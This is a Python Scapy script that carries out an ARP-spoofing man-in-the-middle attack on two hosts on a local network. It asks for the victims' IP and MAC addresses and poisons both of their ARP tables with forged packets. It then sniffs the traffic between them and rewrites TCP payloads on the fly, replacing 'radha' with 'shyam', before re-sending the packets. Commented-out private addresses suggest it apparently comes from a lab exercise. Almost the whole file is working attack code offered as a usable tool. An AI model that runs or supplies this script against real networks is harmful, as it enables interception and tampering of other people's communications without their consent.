#!/usr/bin/python3
from scapy.all import *
#and str(pkt.getlayer(TCP).seq) not in list # its a if condition
def sendingarprequest():
        print("Posining MAC address in target 1 routing table....")
        ether1=Ether()
        ether1.dst=target1mac
        ether1.src=YourMac
        arp1=ARP()
        arp1.psrc=target2
        arp1.hwsrc=YourMac
        arp1.pdst=target1
        arp1.op=1
        frame=ether1/arp1
        sendp(frame)   # sending an arp response
        print("Posining MAC address in target 2 routing table....")
        ether2=Ether()
        ether2.dst=target2mac
        ether2.src=YourMac
        arp2=ARP()
        arp2.psrc=target1
        arp2.hwsrc=YourMac
        arp2.pdst=target2
        arp2.op=1
        frame=ether2/arp2
        sendp(frame)   # we use sendp(pkt) at layer 2
def spoof_packet(pkt):
     print("entered in def function")
     #spoofing packet
     if  (pkt.haslayer(TCP) and pkt[Ether].src != YourMac) or (pkt.haslayer(UDP) and pkt[Ether].src != YourMac):
                   print("entered in spoofing area")
                   if pkt.haslayer(TCP) and pkt[TCP].payload:
                      print("---------------------tcppayload protocol---------------------------------------------")
                      print("---------------------tcppayload protocol---------------------------------------------")
                      print("entered in tcp area.....")
                      data = pkt[TCP].payload.load
                      #list.append(str(pkt.getlayer(TCP).seq))
                      #print("seq %s and ack %s" %(str(pkt.getlayer(TCP).seq),str(pkt.getlayer(TCP).ack)))
                      print("packet type is TCP")
                      print("data1 of size  %d from %s to %s: %s" %(len(data),pkt[IP].src,pkt[IP].dst,data))
                      #pkt.show()
                      newpkt = pkt[IP]  # newpkt = IP(pkt[IP])
                      del(newpkt.chksum)
                      del(newpkt[TCP].payload)
                      del(newpkt[TCP].chksum)
                      newdata = data.replace(b'radha',b'shyam')
                      #newdata = data
                      newpkt = newpkt/newdata
                      send(newpkt)   # we use send(pkt) at layer 3
                      pkt = None
                      print("----------------------------tcpdone--------------------------------------")
                   #elif pkt[IP].src == target1 and pkt[IP].dst == target2 and pkt[UDP].payload:
                      #data = pkt[UDP].payload.load
                      #print("Packet type is UDP")
                      #pkt.getlayer(TCP).seq.append(list)
                      #print("data2 of size  %d from %s to %s: %s" %(len(data),target1,target2,data))
                      #newpkt = pkt[IP]
                      #del(newpkt.chksum)
                      #del(newpkt[TCP].payload)
                      #del(newpkt[TCP].chksum)
                      #newdata = data.replace(b'radha',b'shyam')
                      #newdata = data
                      #newpkt = newpkt/newdata
                      #send(newpkt)
                      #print("------------------------------------------------------------------")
                   #elif pkt.haslayer(UDP) and pkt[UDP].payload:
                      #pkt.summary()
                      #data = pkt[UDP].payload.load
                      #list.append(str(pkt.getlayer(TCP).seq))
                      #print("seq %s and ack %s" %(str(pkt.getlayer(TCP).seq),str(pkt.getlayer(TCP).ack)))
                      #print("packet type is UDP")
                      #print("data3 of size  %d from %s to %s: %s" %(len(data),pkt[IP].src,pkt[IP].dst,data))
                      #newpkt = pkt[IP]
                      #del(newpkt.chksum)
                      #del(newpkt[UDP].payload)
                      #del(newpkt[UDP].chksum)
                      #newdata = data.replace(b'radha',b'shyam')
                      #newdata = data
                      #newpkt = newpkt/newdata
                      #sending(newpkt)
                      #print("------------------------------------------------------------------")
                   #elif pkt[IP].src == target1 and pkt[IP].dst == target2 and pkt[UDP].payload:
                      #data = pkt[UDP].payload.load
                      #print("packet type is UDP")
                      #pkt.getlayer(TCP).seq.append(list)
                      #print("data4 of size  %d from %s to %s: %s" %(len(data),target1,target2,data))
                      #newpkt = pkt[IP]
                      #del(newpkt.chksum)
                      #del(newpkt[TCP].payload)
                      #del(newpkt[TCP].chksum)
                      #newdata = data.replace(b'radha',b'shyam')
                      #newdata = data
                      #newpkt = newpkt/newdata
                      #send(newpkt)
                      #print("------------------------------------------------------------------")
                      
                   else: 
                       print("---------------------Summary only---------------------------------------------")
                       print("---------------------Summary only---------------------------------------------")
                       print("in summary area")
                       #pkt.show()
                       newpkt = pkt[IP]    
                       del(newpkt.chksum) 
                       send(newpkt)
                       pkt = None
                       print("------------------------------------------------------------------")
                       print("------------------------------------------------------------------") 
     else:
          
          #pkt.show()
          print("---------------------Another protocol---------------------------------------------")
          print("---------------------Another protocol---------------------------------------------")
          print("protocol not defined")
          pkt.show()
          if pkt[Ether].src != YourMac:
                newpkt = pkt[IP]    
                del(newpkt.chksum) 
                send(newpkt)
                
          else:
               pkt = None
          print("------------------------------------------------------------------")
          print("------------------------------------------------------------------")
     sendingarprequest()     
                      
target1 = input("Target 1 IP: ")
target1mac= input("Target 1 MAC: ")
target2=input("Target 2 IP: ")
target2mac = input("Target 2 MAC: ")
YourMac=input("Your MAC for getting Packets: ")
iface = input("Network Interface you are using currently e.g. usb,wlo1,eth0: ")
# for the sake of simiplicity
#target1 = "192.168.43.246"
#target2 = "192.168.43.136"
#target1mac = "08:00:27:3c:36:f7"
#target2mac = "08:00:27:f9:64:17"
#YourMac = "dc:f5:05:a2:df:d5"
# for the sake of simiplicity

sendingarprequest()
print("getting data.....")
print("at waiting area....")
#f="host target1"
sniff(iface=iface,filter="(ip src "+target1+" and ip dst "+target2 + ") or "+"(ip src "+target2+" and ip dst "+target1 + ")",prn=spoof_packet)
a= 0;
print("packet capture %d"%(a))
a =a +1
